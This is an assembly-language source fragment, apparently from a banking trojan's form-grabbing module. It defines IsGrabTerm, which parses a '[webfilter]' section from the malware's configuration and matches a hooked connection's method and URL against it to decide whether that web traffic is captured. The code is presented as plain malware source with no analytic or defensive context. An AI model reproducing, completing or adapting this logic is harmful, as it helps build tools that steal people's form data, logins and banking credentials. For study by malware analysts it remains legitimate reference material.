
.code

;; ==================================================================================================== ;;
;; IsGrabTerm - decide grab or not                                                                      ;;
;; __in lpData - pointer to data with method and url (len in first dword)                               ;;
;; Return:  0 - failed                                                                                  ;;
;;         !0 - success                                                                                 ;;
;; ==================================================================================================== ;;
IsGrabTerm proc uses ecx edx edi esi dwHandle : dword
	local  lpWebFilterSt  : dword
	local  lpWebFilterEnd : dword



	invokx  &ArrayKeyPos[ebx], lpSendBuffersArray[ebx], dwHandle
	jmpz eax, @ret		;; no stored connections for this handle
	mov  edi, [eax+4]	;; ptr to connection brief


	;; Parse ConfigFileData
	xor  eax, eax
	mov  esi, lpConfigFileData[ebx]
	jmpz esi, @ret		;; if ConfigFileData not exist
	lodsd
	jmpz eax, @ret		;; if ConfigFileData len is 0


	;; Search "\n[webfilter]\n" in ConfigFileData
	lea  ecx, [esi + eax]
	invokx  &StrIPos[ebx], esi, eax, "\n[webfilter]\n", 13
	jmpz eax, @ret
	add  eax, 12
	mov  lpWebFilterSt, eax


	;; Search "\n[end]\n" after "\n[webfilter]\n" in ConfigFileData
	sub  ecx, eax
	invokx  &StrIPos[ebx], eax, ecx, "\n[end]\n", 7
	jmpz eax, @ret
	inc  eax
	mov  lpWebFilterEnd, eax


;; ================================================== ;;
	xor  edx, edx
@next:

	;; Search "\n" (next string) between [webfilter] & [end]
	mov  ecx, lpWebFilterEnd
	sub  ecx, lpWebFilterSt
	invokx  &StrIPos[ebx], lpWebFilterSt, ecx, "\n", 1
	jmpz eax, @end
	inc  eax
	cmp  lpWebFilterEnd, eax
	je   @end
	mov  lpWebFilterSt, eax


	xor  esi, esi
	inc  esi		;; set grab flag modificator
	cmp  byte ptr[eax], "!"
	jne  @F

	dec  esi		;; reset grab flag modificator
	inc  eax		;; next char
	dec  ecx		;; new len


@@:	invokx  &Compare[ebx], edi, eax, ecx
	jmpz eax, @next


	;; Set Grab Flag
	mov  edx, esi
	jmp  @next


@end:
	mov  eax, edx

@ret:
	ret
IsGrabTerm endp

